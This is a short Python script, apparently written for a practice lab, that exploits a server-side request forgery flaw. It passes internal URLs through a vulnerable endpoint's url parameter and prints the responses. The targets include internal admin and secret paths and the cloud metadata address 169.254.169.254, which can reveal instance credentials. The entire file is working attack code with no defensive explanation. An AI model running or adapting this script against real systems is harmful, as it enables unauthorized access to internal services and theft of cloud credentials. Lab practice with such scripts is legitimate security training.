import requests

# Configuration
base_url = "http://127.0.0.1:42001/"
vuln_url = base_url + "vulnerable-endpoint"
ssrf_url = "http://127.0.0.1:80/admin"  # Internal service we want to access

# Headers
headers = {
    'Cookie': 'PHPSESSID=rkg47evun26n2jg6vjhrg3vlk8; security=low',
}

def exploit_ssrf(target_url):
    params = {
        'url': target_url  # The parameter name might be different depending on the application
    }
    response = requests.get(vuln_url, params=params, headers=headers)
    print("Response from SSRF attack:")
    print(response.text)

def main():
    print(f"Exploiting SSRF vulnerability to access internal URL: {ssrf_url}")
    exploit_ssrf(ssrf_url)

    # You can add more internal URLs to test
    internal_urls = [
        "http://127.0.0.1:80/",
        "http://127.0.0.1:80/admin",
        "http://127.0.0.1:80/secret",
        "http://169.254.169.254/latest/meta-data/"
    ]

    for url in internal_urls:
        print(f"Testing internal URL: {url}")
        exploit_ssrf(url)

if __name__ == "__main__":
    main()
